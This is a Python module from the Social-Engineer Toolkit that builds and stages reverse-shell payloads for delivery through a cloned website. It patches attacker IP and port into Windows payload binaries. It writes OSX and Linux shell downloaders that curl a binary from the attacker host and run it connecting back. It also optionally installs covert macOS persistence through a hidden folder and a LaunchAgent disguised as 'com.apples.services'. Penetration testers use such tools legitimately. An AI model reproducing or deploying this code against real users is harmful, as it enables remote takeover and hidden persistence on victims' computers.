#!/usr/bin/env python
############################################
# Code behind the SET interactive shell and RATTE
############################################
import os
import sys
import subprocess
import re
import shutil
import time
from src.core.setcore import *

definepath = os.getcwd()
sys.path.append(definepath)

# grab operating system
operating_system = check_os()

# check the config file
fileopen = open("/etc/setoolkit/set.config", "r")
for line in fileopen:
    line = line.rstrip()
    # define if we use upx encoding or not
    match = re.search("UPX_ENCODE=", line)
    if match:
        upx_encode = line.replace("UPX_ENCODE=", "")
    # set the upx flag
    match1 = re.search("UPX_PATH=", line)
    if match1:
        upx_path = line.replace("UPX_PATH=", "")
        if upx_encode == "ON":
            if not os.path.isfile(upx_path):
                if operating_system != "windows":
                    print_warning(
                        "UPX packer not found in the pathname specified in config. Disabling UPX packing for executable")
                upx_encode == "OFF"
    # if we removed the set shells to free up space, needed for pwniexpress
    match2 = re.search("SET_INTERACTIVE_SHELL=", line)
    if match2:
        line = line.replace("SET_INTERACTIVE_SHELL=", "").lower()
        if line == "off":
            sys.exit(
                "\n   [-] SET Interactive Mode is set to DISABLED. Please change it in the SET config")

# make directory if it's not there
if not os.path.isdir(userconfigpath + "web_clone/"):
    os.makedirs(userconfigpath + "web_clone/")

# grab ip address and SET web server interface
if os.path.isfile(userconfigpath + "interface"):
    fileopen = open(userconfigpath + "interface", "r")
    for line in fileopen:
        ipaddr = line.rstrip()

        # Open the IPADDR file
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input(
            setprompt("0", "IP address to connect back on for the reverse listener"))
        update_options("IPADDR=" + ipaddr)
        webserver = ipaddr

else:

    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input(
            setprompt("0", "IP address to connect back on for the reverse listener"))
        update_options("IPADDR=" + ipaddr)
    webserver = ipaddr

# grab port options from payloadgen.py
if check_options("PORT=") != 0:
    port = check_options("PORT=")

else:
    port = raw_input(
        setprompt("0", "Port you want to use for the connection back"))


# define the main variables here

# generate a random executable name per instance
exe_name = generate_random_string(10, 10) + ".exe"

webserver = webserver + " " + port

# store for later
reverse_connection = webserver

webserver = exe_name + " " + webserver

# this is generated through payloadgen.py and lets SET know if its a RATTE
# payload or SET payload
if os.path.isfile(userconfigpath + "set.payload"):
    fileopen = open(userconfigpath + "set.payload", "r")
    for line in fileopen:
        payload_selection = line.rstrip()
else:
    payload_selection = "SETSHELL"


# determine if we want to target osx/nix as well
posix = False
# find if we selected it
if os.path.isfile(userconfigpath + "set.payload.posix"):
    # if we have then claim true
    posix = True

# if we selected the SET Interactive shell in payloadgen
if payload_selection == "SETSHELL":
    # replace ipaddress with one that we need for reverse connection back
    fileopen = open("src/payloads/set_payloads/downloader.windows", "rb")
    data = fileopen.read()
    filewrite = open(userconfigpath + "msf.exe", "wb")
    host = int(len(exe_name) + 1) * "X"
    webserver_count = int(len(webserver) + 1) * "S"
    ipaddr_count = int(len(ipaddr) + 1) * "M"
    filewrite.write(data.replace(str(host), exe_name + "\x00", 1))
    filewrite.close()
    fileopen = open(userconfigpath + "msf.exe", "rb")
    data = fileopen.read()
    filewrite = open(userconfigpath + "msf.exe", "wb")
    filewrite.write(data.replace(str(webserver_count), webserver + "\x00", 1))
    filewrite.close()
    fileopen = open(userconfigpath + "msf.exe", "rb")
    data = fileopen.read()
    filewrite = open(userconfigpath + "msf.exe", "wb")
    filewrite.write(data.replace(str(ipaddr_count), ipaddr + "\x00", 1))
    filewrite.close()

# if we selected RATTE in our payload selection
if payload_selection == "RATTE":
    fileopen = open("src/payloads/ratte/ratte.binary", "rb")
    data = fileopen.read()
    filewrite = open(userconfigpath + "msf.exe", "wb")
    host = int(len(ipaddr) + 1) * "X"
    rPort = int(len(str(port)) + 1) * "Y"
    filewrite.write(data.replace(str(host), ipaddr + "\x00", 1))
    filewrite.close()
    fileopen = open(userconfigpath + "msf.exe", "rb")
    data = fileopen.read()
    filewrite = open(userconfigpath + "msf.exe", "wb")
    filewrite.write(data.replace(str(rPort), str(port) + "\x00", 1))
    filewrite.close()

print_status("Done, moving the payload into the action.")

if upx_encode == "ON" or upx_encode == "on":
    # core upx
    pass

if os.path.isfile(userconfigpath + "web_clone/msf.exe"):
    os.remove(userconfigpath + "web_clone/msf.exe")
if os.path.isfile(userconfigpath + "msf.exe"):
    shutil.copyfile(userconfigpath + "msf.exe", userconfigpath + "web_clone/msf.exe")

if payload_selection == "SETSHELL":
    if os.path.isfile(userconfigpath + "web_clone/x"):
        os.remove(userconfigpath + "web_clone/x")
    shutil.copyfile("%s/src/payloads/set_payloads/shell.windows" %
                    (definepath), userconfigpath + "web_clone/x")

# if we are targetting nix
if posix == True:
    print_info(
        "Targetting of OSX/Linux (POSIX-based) as well. Prepping posix payload...")
    filewrite = open(userconfigpath + "web_clone/mac.bin", "w")
    payload_flags = webserver.split(" ")
    # grab osx binary name
    osx_name = generate_random_string(10, 10)
    downloader = "#!/bin/sh\ncurl -C -O http://%s/%s > /tmp/%s\nchmod +x /tmp/%s\n./tmp/%s %s %s &" % (
        payload_flags[1], osx_name, osx_name, osx_name, osx_name, payload_flags[1], payload_flags[2])
    filewrite.write(downloader + "\n")
    persistence = check_config("ENABLE_PERSISTENCE_OSX=").lower()
    if persistence == "on":
        # modified persistence osx from
        # http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/
        filewrite.write(r"mkdir ~/Library/.hidden")
        filewrite.write("\n")
        filewrite.write("cp /tmp/%s ~/Library/.hidden" % (osx_name))
        filewrite.write("\n")
        filewrite.write(r"echo '#!/bin/bash' > ~/Library/.hidden/connect.sh")
        filewrite.write("\n")
        filewrite.write("echo './%s %s %s &' >> ~/Library/.hidden/connect.sh" %
                        (osx_name, payload_flags[1], payload_flags[2]))
        filewrite.write("\n")
        filewrite.write(
            r"echo 'chmod +x ~/Library/.hidden/connect.sh' >> ~/Library/.hidden/connect.sh")
        filewrite.write("\n")
        filewrite.write(r"mkdir ~/Library/LaunchAgents")
        filewrite.write("\n")
        filewrite.write(
            "echo '<plist version=\"1.0\">' > ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"echo '<dict>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"echo '<key>Label</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"echo '<string>com.apples.services</string>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"echo '<key>ProgramArguments</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"echo '<array>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"echo '<string>/bin/sh</string>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            "echo '<string>'$HOME'/Library/.hidden/connect.sh</string>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"echo '</array>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"echo '<key>RunAtLoad</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"echo '<true/>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"echo '<key>StartInterval</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"echo '<integer>60</integer>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"echo '<key>AbandonProcessGroup</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"echo '<true/>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"echo '</dict>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"echo '</plist>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"chmod 600 ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(
            r"launchctl load ~/Library/LaunchAgents/com.apples.services.plist")

    filewrite.close()
    # grab nix binary name
    #linux_name = check_options("NIX.BIN=")
    linux_name = generate_random_string(10, 10)
    downloader = "#!/usr/bin/sh\ncurl -C - -O http://%s/%s\nchmod +x %s\n./%s %s %s &" % (
        payload_flags[1], linux_name, linux_name, linux_name, payload_flags[1], payload_flags[2])
    filewrite = open(userconfigpath + "web_clone/nix.bin", "w")
    filewrite.write(downloader)
    filewrite.close()
    shutil.copyfile(definepath + "/src/payloads/set_payloads/shell.osx",
                    userconfigpath + "web_clone/%s" % (osx_name))
    shutil.copyfile(definepath + "/src/payloads/set_payloads/shell.linux",
                    userconfigpath + "web_clone/%s" % (linux_name))

    # copy over the downloader scripts
    osx_down = check_options("MAC.BIN=")
    lin_down = check_options("NIX.BIN=")
    shutil.copyfile(userconfigpath + "web_clone/nix.bin",
                    userconfigpath + "web_clone/%s" % (lin_down))
    shutil.copyfile(userconfigpath + "web_clone/mac.bin",
                    userconfigpath + "web_clone/%s" % (osx_down))

# check to see if we are using a staged approach or direct shell
stager = check_config("SET_SHELL_STAGER=").lower()
if stager == "off" or payload_selection == "SETSHELL_HTTP":
    # only trigger if we are using the SETSHELL
    if payload_selection == "SETSHELL" or payload_selection == "SETSHELL_HTTP":
        # ensure that index.html is really there
        if os.path.isfile(userconfigpath + "web_clone/index.html"):
            print_status(
                "Stager turned off, prepping direct download payload...")
            fileopen = open(userconfigpath + "web_clone/index.html", "r")
            filewrite = open(userconfigpath + "web_clone/index.html.3", "w")
            data = fileopen.read()
            # replace freehugs with ip and port
            data = data.replace("freehugs", reverse_connection)
            filewrite.write(data)
            filewrite.close()
            time.sleep(1)

            # here we remove old stuff and replace with everything we need to
            # be newer
            if payload_selection == "SETSHELL":
                try:
                    if os.path.isfile(userconfigpath + "web_clone/index.html"):
                        os.remove(userconfigpath + "web_clone/index.html")
                    shutil.copyfile(userconfigpath + "web_clone/index.html.3",
                                    userconfigpath + "web_clone/index.html")
                    if os.path.isfile(userconfigpath + "web_clone/index.html.3"):
                        os.remove(userconfigpath + "web_clone/index.html.3")
                    if os.path.isfile(userconfigpath + "web_clone/msf.exe"):
                        os.remove(userconfigpath + "web_clone/msf.exe")
                    shutil.copyfile(userconfigpath + "web_clone/x",
                                    userconfigpath + "web_clone/msf.exe")
                    shutil.copyfile(
                        userconfigpath + "web_clone/msf.exe", userconfigpath + "msf.exe")
                    if os.path.isfile(userconfigpath + "msf.exe"):
                        os.remove(userconfigpath + "msf.exe")
                    shutil.copyfile(
                        userconfigpath + "web_clone/msf.exe", userconfigpath + "msf.exe")

                # catch errors, will convert to log later
                except Exception as error:
                    log(error)

            # if we are using the HTTP reverse shell then lets use this
            if payload_selection == "SETSHELL_HTTP":
                try:
                    if os.path.isfile(userconfigpath + "web_clone/index.html"):
                        os.remove(userconfigpath + "web_clone/index.html")
                    shutil.copyfile(userconfigpath + "web_clone/index.html.3",
                                    userconfigpath + "web_clone/index.html")
                    if os.path.isfile(userconfigpath + "web_clone/index.html.3"):
                        os.remove(userconfigpath + "web_clone/index.html.3")
                    if os.path.isfile(userconfigpath + "web_clone/msf.exe"):
                        os.remove(userconfigpath + "web_clone/msf.exe")
                    shutil.copyfile(
                        "src/payloads/set_payloads/http_shell.binary", userconfigpath + "web_clone/msf.exe")
                    shutil.copyfile(
                        userconfigpath + "web_clone/msf.exe", userconfigpath + "msf.exe")
                    if os.path.isfile(userconfigpath + "msf.exe"):
                        os.remove(userconfigpath + "msf.exe")
                    shutil.copyfile(
                        userconfigpath + "web_clone/msf.exe", userconfigpath + "msf.exe")

                # catch errors, will convert to log later
                except Exception as error:
                    log(error)
